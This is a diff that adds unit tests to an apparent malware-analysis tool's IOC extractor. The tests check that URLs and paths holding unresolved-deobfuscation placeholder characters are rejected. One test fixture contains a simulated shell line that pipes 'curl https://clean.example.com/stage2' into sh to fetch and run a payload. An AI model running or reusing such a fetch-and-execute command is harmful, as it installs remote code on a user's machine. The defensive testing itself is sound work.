@@ -235,3 +235,56 @@ test('ioc-extract: core stays tldts-free — no IOC.DOMAIN emitted directly', ()
     `core must not emit IOC.DOMAIN directly; got: ${JSON.stringify(domains)}`);
 });
 
+// ── Unresolved-sentinel rejection ──────────────────────────────────────────
+//
+// Obfuscation decoders emit `⟨unresolved:NAME⟩` / `⟨VAR:~start,len⟩` /
+// `⟨…⟩` sentinels (U+27E8 / U+27E9) in partially-resolved cleartext. The
+// encoded-content reassembler (`src/encoded-reassembler.js::analyze`)
+// splices this decoder output verbatim into the stitched reconstructed
+// script and then calls `extractInterestingStringsCore` on the result.
+// The extractor must drop any IOC value carrying a sentinel — a URL
+// like `https://⟨unresolved:__cViNLHc⟩/` is not a real pivot. Without
+// the gate, these leaked into `novelIocs` and the host's `app-load.js`
+// pushed them directly via `pushIOC`, polluting the IOC sidebar.
+
+test('ioc-extract: rejects URL carrying ⟨unresolved:…⟩ sentinel', () => {
+  // Reassembled AppleScript-shell output shape — partial resolution
+  // leaves the variable name as a ⟨unresolved:…⟩ placeholder inside a
+  // real-looking URL.
+  const text = 'do shell script "curl https://\u27E8unresolved:__cViNLHc\u27E9/ && '
+             + 'curl https://clean.example.com/stage2 | sh"';
+  const r = extractInterestingStringsCore(text);
+  for (const row of r.findings) {
+    assert.ok(!/\u27E8|\u27E9/.test(row.url || ''),
+      `no IOC row may carry \u27E8 / \u27E9 sentinel chars; leaked: ${JSON.stringify(row)}`);
+  }
+  const urls = valuesOfType(r.findings, IOC.URL);
+  assert.ok(urls.includes('https://clean.example.com/stage2'),
+    `clean URL must still land; got urls: ${JSON.stringify(urls)}`);
+});
+
+test('ioc-extract: rejects CMD-style ⟨VAR:~start,len⟩ substring-op sentinels in URLs', () => {
+  const text = 'start http://\u27E8VAR:~0,3\u27E9.example/ && start https://good.example/x';
+  const r = extractInterestingStringsCore(text);
+  for (const row of r.findings) {
+    assert.ok(!/\u27E8|\u27E9/.test(row.url || ''),
+      `no IOC row may carry a sentinel; leaked: ${JSON.stringify(row)}`);
+  }
+  const urls = valuesOfType(r.findings, IOC.URL);
+  assert.ok(urls.includes('https://good.example/x'),
+    `clean URL must still land; got: ${JSON.stringify(urls)}`);
+});
+
+test('ioc-extract: sentinel gate applies to non-URL IOC types too', () => {
+  // The gate is inside `add()`, so it covers every type: EMAIL, FILE_PATH,
+  // IP, etc. Feed a synthetic line with a sentinel-bearing path alongside
+  // a clean URL.
+  const text = 'C:\\Users\\\u27E8unresolved:_User\u27E9\\AppData\\malware.exe '
+             + 'with real URL https://ok.example/';
+  const r = extractInterestingStringsCore(text);
+  for (const row of r.findings) {
+    assert.ok(!/\u27E8|\u27E9/.test(row.url || ''),
+      `no IOC row may carry a sentinel; leaked type=${row.type}: ${JSON.stringify(row)}`);
+  }
+});
+
